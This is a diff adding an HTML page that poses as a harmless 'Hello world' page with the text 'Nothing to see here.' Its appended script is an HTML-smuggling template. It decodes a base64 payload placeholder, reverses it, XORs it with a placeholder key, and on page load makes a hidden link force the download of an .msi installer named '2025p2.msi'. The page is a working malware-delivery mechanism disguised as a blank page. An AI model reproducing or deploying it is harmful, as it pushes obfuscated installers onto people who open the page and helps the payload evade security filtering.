@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hello world</title>
+</head>
+<body>
+
+<p>Nothing to see here.</p>
+
+</body>
+
+<script>
+function B64ToBuffer() {
+    var b64String = INPUT_PLACEHOLDER;
+    var byteStr = window.atob(b64String);
+    var bStrLen = byteStr.length;
+    var retBytes = new Uint8Array(bStrLen);
+    var inputKey = new Uint8Array(KEY_PLACEHOLDER);
+    var keyLength = inputKey.length;
+    for (var i = 0; i < bStrLen; i++) {
+        retBytes[i] = byteStr.charCodeAt(bStrLen - i - 1);
+        retBytes[i] = retBytes[i] ^ inputKey[i % keyLength];
+    }
+    return retBytes.buffer;
+}
+var fileByteBuffer = B64ToBuffer();
+var fileBlob = new Blob([fileByteBuffer], {type: 'octet/stream'});
+var linkAnchor = document.createElement('a');
+document.body.appendChild(linkAnchor);
+linkAnchor.stye = 'display: none';
+var fileUrl = window.URL['createObjectURL'](fileBlob);
+linkAnchor['href'] = fileUrl;
+linkAnchor['download'] = '2025p2.msi';
+linkAnchor['click']();
+window.URL['revokeObjectURL'](fileUrl);
+</script>
+</html>
